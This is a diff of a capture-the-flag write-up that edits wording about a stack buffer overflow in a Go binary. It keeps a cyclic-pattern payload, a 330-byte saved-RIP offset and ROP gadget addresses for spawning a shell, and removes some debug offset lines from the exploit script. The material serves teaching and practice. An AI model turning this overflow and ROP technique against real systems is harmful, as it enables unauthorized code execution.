@@ -231,10 +231,11 @@ p += b"Ojou! <3"
 p += cyclic(700).replace(p64(0x61706261616f6261), p64(0x0))
 ```
 
-After rerun the program, the program successfully called the `runtime_slicebytetostring()` function. Once again, the program crashed. But this time, the program crashed because we managed to overwrite the saved RIP of the main function with the cyclic pattern that I've inputed before.
+After rerun the program, the program successfully called the `runtime_slicebytetostring()` function. Once again, the program crashed. But this time, the program crashed because we managed to overwrite the saved RIP of the main function with the cyclic pattern that we've inputed before.
+
 ![Saved RIP Overwrited](images/d1dca8e9edd54880b69cfdc0ce0890d30354e868485ce9f17d7627eec4630d4b.png)  
 
-The offset to overwrite the saved RIP was 330 byte (8 byte the length of "Ojou! \<3" + 322 byte from the cyclic). After that, I searched for gadgets that I could use to call a shell. Here are some of the gadgets I used to obtain a shell:
+The offset to overwrite the saved RIP was 330 byte (8 byte the length of "Ojou! \<3" + 322 byte from the cyclic). After that, I searched for gadgets that I could use to spawn a shell. Here are some of the gadgets I used to obtain a shell:
 ```python
 POP_RBX = 0x0000000000404541 # : pop rbx ; ret
 POP_RDX = 0x0000000000479d7a # : pop rdx ; ret
@@ -298,9 +299,7 @@ def exploit(io, libc=null):
             gdb.attach(io, gdbscript=cmd)
 
     MAIN_ADDRESS = 0x47dae0
-    # === Debug using this payload: b"Ojou! <3"+cyclic(512)
-    RCX_OFFSET = cyclic_find(0x616f6261)
-    RSI_OFFSET = cyclic_find(0x616d6261)
+
     # === Gadget
     BSS_ADDRESS = 0x524100
     POP_RBX = 0x0000000000404541 # : pop rbx ; ret
